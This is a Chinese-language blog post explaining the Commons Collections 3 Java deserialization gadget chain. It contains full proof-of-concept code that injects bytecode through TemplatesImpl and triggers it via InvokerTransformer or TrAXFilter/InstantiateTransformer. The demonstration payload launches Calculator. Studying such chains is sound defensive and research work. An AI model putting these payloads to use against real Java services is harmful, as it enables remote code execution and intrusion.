---  
title: CommonsCollections3链详解  
subtitle:  
date: 2024-01-16T19:42:15+08:00  
slug: 02d3e21  
draft: false
author:  
  name: N1Rvana  
  email: beichenghua@gmail.com  
  avatar: avatar.png 
description:  
keywords:  
license:  
comment: false  
weight: 0  
tags:  
  - CommonsCollections  
categories:  
  - Java  
hiddenFromHomePage: false  
hiddenFromSearch: false  
hiddenFromRss: false  
hiddenFromRelated: false  
summary:  
resources:  
  - name: featured-image  
    src: featured-image.jpg  
  - name: featured-image-preview  
    src: featured-image-preview.jpg  
toc: true  
math: false  
lightgallery: false  
password:  
message:  
repost:  
  enable: true  
  url:  
  
# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter  
---  
  
<!--more-->  
## CommonsCollections3详解  
通过类动态加载可以得知`defineClass`可以执行任意代码  
全局搜索一下哪里调用了`defineClass`,  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161728002.png)
`TemplatesImpl`类里调用了，再全局搜索一下哪里调用了这里的`defineClass`类  
在`defineTransletClasses`方法这里进行了调用  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161732725.png) 
再搜索一下哪里调用了`defineTransletClasses`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161733135.png)
在`getTransletInstance()`方法调用了`defineTransletClasses()`方法并且，还执行了`newInstance()`进行了初始化操作，可以将注入的类执行  
编写这部分的`poc`  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
    
public class CommonsCollections3 {    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
        templatesImpl.newTransformer();    
    }    
}  
```  
Test.java  
```java  
import java.io.IOException;    
    
import com.sun.org.apache.xalan.internal.xsltc.DOM;    
import com.sun.org.apache.xalan.internal.xsltc.TransletException;    
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;    
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;    
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;    
    
public class Test extends AbstractTranslet {    
    {    
        try {    
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");    
        } catch (IOException e) {    
            throw new RuntimeException(e);    
        }    
    }    
    
    @Override    
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    
    
    }    
    
    @Override    
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {    
    
    }    
}  
```  
通过上面的例子，我们只需要调用到`newTransformer()`方法即可，回想 CC1链是有任意类任意方法调用的，所以直接把 CC1 复制过来  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.map.LazyMap;    
    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.annotation.Target;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.Field;    
import java.lang.reflect.InvocationHandler;    
import java.lang.reflect.Proxy;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections3 {    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(templatesImpl),    
                new InvokerTransformer("newTransformer",null,null)    
        };    
    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);    
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);    
        AnnotationInvocationHandlerConstructor.setAccessible(true);    
        InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap);    
    
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);    
    
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap);    
    
        //serialize(o);    
        unserialize("ser.bin");    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161825369.png)
## 另一条  
上面的例子可以得知是`InvokerTransformer`类的`transformer`调用了`TemplateImpl`类的`newTransformer()`方法才得以执行的，这里再找一个其他类调用`newTransformer()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161850661.png)
在`TrxAXFilter`类的构造器中调用了`newTransformer()`方法，但是`TrxAXFilter`类无法被序列化，所以找一个可以被序列化的类来调用`TrxAXFilter`类的构造器，这里选择了`InstantiateTransformer`类中的`transformer()`方法，来调用上面的构造器从而调用到`newTransformer()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161854717.png)
构造`poc`  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InstantiateTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.map.LazyMap;    
    
import javax.xml.transform.Templates;    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.annotation.Target;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.Field;    
import java.lang.reflect.InvocationHandler;    
import java.lang.reflect.Proxy;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections3 {    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(TrAXFilter.class),    
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})    
        };    
    
    
    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);    
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);    
        AnnotationInvocationHandlerConstructor.setAccessible(true);    
        InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap);    
    
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);    
    
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap);    
    
        //serialize(o);    
        unserialize("ser.bin");    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
  
  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401161937418.png)
  